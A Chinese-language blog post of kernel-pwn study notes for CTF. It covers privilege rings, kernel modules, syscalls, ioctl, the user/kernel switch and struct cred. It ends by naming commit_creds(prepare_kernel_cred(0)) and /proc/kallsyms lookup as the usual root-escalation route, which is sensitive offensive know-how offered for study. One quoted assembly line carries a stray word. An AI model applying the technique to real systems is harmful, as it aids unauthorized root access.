<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>kernel note | S1nec-1o's B1og</title><meta name="author" content="s1nec-1o"><meta name="copyright" content="s1nec-1o"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="kernel笔记首先是要配置环境，推荐[wiki](Qemu 模拟环境 - CTF Wiki (ctf-wiki.org))和这篇文章 其中调试部分我还搁置着准备等学有所成再来实战 可以将内核看作一个巨大的elf，它又有数据段 基础知识Kernelkernel 也是一个程序，用来管理软件发出的数据 I&#x2F;O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel note">
<meta property="og:url" content="http://s1nec-1o.github.io/2024/04/28/kernel-note/index.html">
<meta property="og:site_name" content="S1nec-1o&#39;s B1og">
<meta property="og:description" content="kernel笔记首先是要配置环境，推荐[wiki](Qemu 模拟环境 - CTF Wiki (ctf-wiki.org))和这篇文章 其中调试部分我还搁置着准备等学有所成再来实战 可以将内核看作一个巨大的elf，它又有数据段 基础知识Kernelkernel 也是一个程序，用来管理软件发出的数据 I&#x2F;O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png">
<meta property="article:published_time" content="2024-04-28T11:15:48.000Z">
<meta property="article:modified_time" content="2024-04-28T14:13:18.073Z">
<meta property="article:author" content="s1nec-1o">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281712481.jpg"><link rel="canonical" href="http://s1nec-1o.github.io/2024/04/28/kernel-note/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"距离文章发布已经过去","messageNext":"天了，信息可能已经过时"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'kernel note',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-28 22:13:18'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 8 || hour >= 20
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="S1nec-1o's B1og" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><nav id="nav"><span id="blog-info"><a href="/" title="S1nec-1o's B1og"><span class="site-name">S1nec-1o's B1og</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">kernel note</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-28T11:15:48.000Z" title="发表于 2024-04-28 19:15:48">2024-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-28T14:13:18.073Z" title="更新于 2024-04-28 22:13:18">2024-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/kernel-pwn/">kernel-pwn</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="kernel笔记"><a href="#kernel笔记" class="headerlink" title="kernel笔记"></a>kernel笔记</h1><p>首先是要配置环境，推荐[wiki](<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/">Qemu 模拟环境 - CTF Wiki (ctf-wiki.org)</a>)和<a target="_blank" rel="noopener" href="https://www.cjovi.icu/pwnreview/1318.html">这篇文章</a></p>
<p>其中调试部分我还搁置着准备等学有所成再来实战</p>
<p>可以将内核看作一个巨大的elf，它又有数据段</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>kernel 也是一个程序，用来管理软件发出的数据 I&#x2F;O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。</p>
<p><img src="C:/Users/Lenovo/Pictures/Saved%20Pictures/Kernel_Layout.svg+xml"></p>
<p>kernel 最主要的功能有两点：</p>
<ol>
<li>控制并与硬件进行交互</li>
<li>提供 application 能运行的环境</li>
</ol>
<p>包括 I&#x2F;O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p>
<p>需要注意的是，<strong>kernel 的 crash 通常会引起重启</strong>。</p>
<h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p>
<p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p>
<p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p>
<p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p>
<h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h2><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p>
<ul>
<li>驱动程序（Device drivers）<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>…</li>
</ul>
</li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe&#x2F;dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p>
<p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p>
<p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p>
<blockquote>
<p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
</blockquote>
<h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><ul>
<li><strong>insmod</strong>: 讲指定模块加载到内核中</li>
<li><strong>rmmod</strong>: 从内核中卸载指定模块</li>
<li><strong>lsmod</strong>: 列出已经加载的模块</li>
<li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li>
</ul>
<blockquote>
<p>大多数　CTF 中的 kernel vulnerability 也出现在 LKM 中。</p>
</blockquote>
<h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p>
<blockquote>
<p>在 <em>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h</em> 和 <em>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p>
<p>同时推荐一个很好用的网站 <a target="_blank" rel="noopener" href="https://syscalls.kernelgrok.com/">Linux Syscall Reference</a>，可以查阅 32 位系统调用对应的寄存器含义以及源码。64 位系统调用可以查看 <a target="_blank" rel="noopener" href="https://syscalls64.paolostivanin.com/">Linux Syscall64 Reference</a></p>
</blockquote>
<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>直接查看 man 手册</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The <span class="title function_">ioctl</span><span class="params">()</span> system call manipulates the underlying device parameters of special</span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       <span class="title function_">files</span>  <span class="params">(e.g., terminals)</span> may be controlled with <span class="title function_">ioctl</span><span class="params">()</span> requests.  The argument</span><br><span class="line">       fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It&#x27;s traditionally <span class="type">char</span> *<span class="title function_">argp</span> <span class="params">(from the days</span></span><br><span class="line"><span class="params">       before <span class="type">void</span> * was valid C)</span>, and will be so named <span class="keyword">for</span> this discussion.</span><br><span class="line"></span><br><span class="line">       An <span class="title function_">ioctl</span><span class="params">()</span> request has encoded in it whether the argument is an in parameter or</span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an <span class="title function_">ioctl</span><span class="params">()</span> request are located in the file &lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure>

<p>可以看出 ioctl 也是一个系统调用，用于与设备通信。</p>
<p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (open) 返回的 <a target="_blank" rel="noopener" href="http://m4x.fun/post/play-with-file-descriptor-1/">文件描述符</a>，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p>
<blockquote>
<p>使用 ioctl 进行通信的原因：</p>
<p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</p>
<p>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</p>
<p>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p>
</blockquote>
<h2 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h2><h2 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h2><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
<ol>
<li><p>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p>
</li>
<li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。</p>
</li>
<li><p>通过 push 保存各寄存器值，具体的 <a target="_blank" rel="noopener" href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> <span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过汇编指令判断是否为 <code>x32_abi</code>。</p>
</li>
<li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p>
</li>
</ol>
<h3 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h3><p>退出时，流程如下：</p>
<ol>
<li>通过 <code>swapgs</code> 恢复 GS 值</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）</li>
</ol>
<h2 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h2><p>之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p>
<p><a target="_blank" rel="noopener" href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred">源码</a> 如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h2 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h2><p>相比用户态库函数，内核态的函数有了一些变化</p>
<ul>
<li><p>printf() -&gt; **printk()**，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</p>
</li>
<li><p>memcpy() -&gt;</p>
<p>copy_from_user()&#x2F;copy_to_user()</p>
<ul>
<li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li>
<li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
</ul>
</li>
<li><p>malloc() -&gt; **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></p>
</li>
<li><p>free() -&gt; **kfree()**，同 kmalloc()</p>
</li>
</ul>
<p>另外要注意的是，<code>kernel 管理进程，因此 kernel 也记录了进程的权限</code>。kernel 中有两个可以方便的改变权限的函数：</p>
<ul>
<li><strong>int commit_creds(struct cred *new)</strong></li>
<li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li>
</ul>
<p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</p>
<blockquote>
<p>更多关于 <code>prepare_kernel_cred</code> 的信息可以参考 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.6/source/kernel/cred.c#L594">源码</a></p>
</blockquote>
<p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>）。</p>
